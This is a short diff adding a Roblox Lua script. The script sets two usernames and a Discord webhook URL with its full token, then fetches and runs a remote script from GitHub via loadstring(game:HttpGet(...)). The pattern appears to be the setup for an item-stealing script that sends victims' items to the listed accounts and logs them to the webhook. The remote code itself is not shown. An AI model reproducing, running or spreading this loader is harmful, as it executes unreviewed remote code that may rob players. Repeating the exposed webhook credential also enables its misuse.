@@ -1,0 +1,3 @@
+Username = {"pablogarote","evo12342jjj"} 
+Webhook = "https://discordapp.com/api/webhooks/1370383175439745076/qgPkkZRSZHGR5bU9vUlBM0DAxL4oC44rsv7NQwA1TQ4tX1U3LWTxPw0N3jwK2SdFW7TD" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
